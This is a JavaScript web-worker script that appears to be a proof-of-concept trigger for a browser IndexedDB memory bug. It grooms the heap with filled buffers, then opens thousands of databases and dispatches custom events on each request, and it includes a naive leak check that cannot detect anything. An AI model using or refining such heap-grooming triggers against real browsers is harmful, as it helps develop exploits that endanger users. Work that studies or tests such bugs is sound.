function stressHeap() {
    const buffers = [];
    for (let i = 0; i < 20; i++) {
        const buf = new Uint8Array(4 * 1024);
        buf.fill(0x41);
        buffers.push(buf);
    }
    return buffers;
}

function checkMemoryLeak() {
    const buf = new Uint8Array(4);
    buf.fill(0x46);
    return buf[0] !== 0x46 ? `Leak: 0x${buf[0].toString(16)}` : null;
}

self.onmessage = function(e) {
    if (e.data === 'start') {
        self.postMessage('Grooming heap...');
        stressHeap();

        self.postMessage('Opening IndexedDB...');
        for (let i = 0; i < 5000; i++) {
            let req = indexedDB.open(`db${i}`);
            let ev = new Event('mine');
            try {
                req.dispatchEvent(ev);
            } catch (error) {
                self.postMessage(`Error at iteration ${i}: ${error.message}`);
            }
            req = null;
            ev = null;
            if (i % 500 === 0) {
                stressHeap();
                const leak = checkMemoryLeak();
                if (leak) {
                    self.postMessage(leak);
                }
            }
        }

        self.postMessage('Checking IndexedDB state...');
        let req = indexedDB.open('testdb');
        if (req.readyState === 'done') {
            self.postMessage('IndexedDB state as expected');
        } else {
            self.postMessage(`Unexpected IndexedDB state: ${req.readyState}`);
        }

        const leak = checkMemoryLeak();
        if (leak) {
            self.postMessage(leak);
        } else {
            self.postMessage('No memory changes detected');
        }
    }
};